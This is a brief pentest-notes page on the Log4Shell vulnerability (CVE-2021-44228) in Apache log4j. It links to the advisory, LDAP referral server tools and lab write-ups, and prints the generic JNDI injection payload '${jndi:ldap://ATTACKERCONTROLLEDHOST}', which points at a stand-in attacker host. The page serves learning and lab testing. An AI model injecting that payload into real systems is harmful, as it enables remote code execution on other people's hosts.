---
description: Exploiting Apache Java logging framework
---

# Apache Log4j

### CVE-2021-44228

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" %}

On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package **`log4j`**. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this **`log4j`** version. This attack has been dubbed "Log4Shell"

{% embed url="https://github.com/YfryTchsGD/Log4jAttackSurface" %}

{% embed url="https://log4shell.huntress.com/" %}

The general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like:

**`${jndi:ldap://ATTACKERCONTROLLEDHOST}`**

#### **LDAP Referral Server**

{% embed url="https://github.com/mbechler/marshalsec" %}

{% embed url="https://github.com/veracode-research/rogue-jndi" %}

#### Resources/POC

{% embed url="https://tryhackme.com/room/solar" %}

{% embed url="https://systemweakness.com/write-up-hack-the-box-starting-point-unified-tier-2-d4f3585320a1" %}
